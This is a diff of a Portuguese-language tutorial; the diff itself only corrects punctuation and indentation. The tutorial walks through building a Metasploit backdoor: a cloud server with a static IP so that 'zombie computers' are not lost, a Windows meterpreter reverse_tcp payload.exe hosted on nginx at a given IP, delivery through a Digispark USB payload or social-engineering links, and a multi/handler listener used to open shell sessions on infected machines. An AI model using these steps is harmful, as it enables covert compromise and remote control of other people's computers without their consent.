@@ -4,7 +4,7 @@
 
  Eu estarei utilizando o **GCP(Google cloud platform)** mas você pode utilizar o provedor de **CLOUD** que deseja ou até mesmo um VPS.
 
-Acesso meu console e crio a instância. instância essa que é bem básica, uma micro com SO Debian 9
+Acesso meu console e crio a instância. instância essa que é bem básica, uma micro com SO Debian 9.
 
 Com o a instância criada, eu defino um IP estático para ela.
 O IP estático é necessário para que não ocorra o risco do IP que definirmos no nosso backdoor mudar e perdemos nossos "computadores zumbis" já conquistados.
@@ -13,24 +13,24 @@ O IP estático é necessário para que não ocorra o risco do IP que definirmos 
 
 ![](https://res.cloudinary.com/peerlyst/image/upload/c_limit,dpr_auto,f_auto,fl_lossy,h_428,q_auto,w_880/v1/post-attachments/1567258807005_bbvioc)
 
- Nesse passo vamos instalar nosso canivete suiço **METASPLOIT** para criamos nosso **BACKDOOR** e orquestramos nossos "computadores zumbis"
+ Nesse passo vamos instalar nosso canivete suíço **METASPLOIT** para criamos nosso **BACKDOOR** e orquestramos nossos "computadores zumbis".
 
-   Conecte-se a sua instância por ssh para instalarmos o **METASPLOIT**
+   Conecte-se a sua instância por ssh para instalarmos o **METASPLOIT**.
    
  ```shell
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
 ```
-conceda permisão de execução para o instalador
+Conceda permisão de execução para o instalador.
 
  ```shell
  chmod +x msfinstall
 ```
-agora execute o mesmo
+Agora execute o mesmo.
 
  ```shell
  ./msfinstall
 ```
-e após concluir rode
+E após concluir rode.
 
 
  ```shell
@@ -55,19 +55,19 @@ Rodando um ls para listar os arquivos do diretório verá que o arquivo payload.
 
 O **NGINX** vai ser necessário para  criarmos um servidor web no qual o nosso payload do **Digispark** possa fazer o download do **BACKDOOR** para dentro da máquina alvo. Ou enviarmos o link através de engenharia social para obter acesso a máquina alvo. 
  
- Vamos instalar o nginx
+ Vamos instalar o nginx.
 
  ```shell
  sudo apt-get update
  sudo apt-get install -y nginx
 ```
-Iremos criar uma copia do nosso backdoor dentro da pasta do servidor
+Iremos criar uma copia do nosso backdoor dentro da pasta do servidor.
 
  ```shell
  sudo cp ./payload.exe /var/www/html/payload.exe
 ````
 
-Feito isso nosso arquivo vai esta disponível para download em
+Feito isso nosso arquivo vai esta disponível para download em.
 
 http://34.97.212.80/payload.exe
 
@@ -120,13 +120,13 @@ Depois de iniciado vamos selecionar qual exploit iremos usar, que é o multi/han
 feito isso setamos o meterpreter de conexão reversa tcp para o windows, setamos o nosso HOST e PORTA, os mesmo usados na criação do backdoor, e ExitOnSession para que o manipulador possa continuar executando como trabalho mesmo com uma sessão fechada ou com falha no medidor.
 
 ```shell
-    msf >use exploit/multi/handler
-    msf >set PAYLOAD windows/meterpreter/reverse_tcp
-    msf >set LHOST 34.97.212.80
-    msf >set LPORT 5000
-    msf >set ExitOnSession false
+msf >use exploit/multi/handler
+msf >set PAYLOAD windows/meterpreter/reverse_tcp
+msf >set LHOST 34.97.212.80
+msf >set LPORT 5000
+msf >set ExitOnSession false
 ```
-feito isso estamos prontos para receber nossas conexões, você pode pressionar ctrl+c para liberar o terminal que agora iremos visualizar nossas conexões e obter acesso.
+Feito isso estamos prontos para receber nossas conexões, você pode pressionar ctrl+c para liberar o terminal que agora iremos visualizar nossas conexões e obter acesso.
 
 **Obter acesso a uma máquina infectada**
 
@@ -136,21 +136,21 @@ Para ficar na escuta em tempo real de quem se conectou ou desconectou rode.
 ```shell
 msf > exploit -j -z
 ```
- para listar nossas conexões de entrada até o momento
+ Para listar nossas conexões de entrada até o momento.
 
 ```shell
 msf> sessions -l 
 ```
-você terá uma saída algo como
+Você terá uma saída algo como.
 
 ![](https://s5.gifyu.com/images/sessionsL.png)
 
-e para acessar um "zumbir"
+E para acessar um "zumbir".
 ```shell
 msf> sessions -i <numero da sessão> 
 ```
 
-com isso você obtêm acesso shell 
+com isso você obtêm acesso shell.
 
 ![](https://s5.gifyu.com/images/sessionsI.png)
 
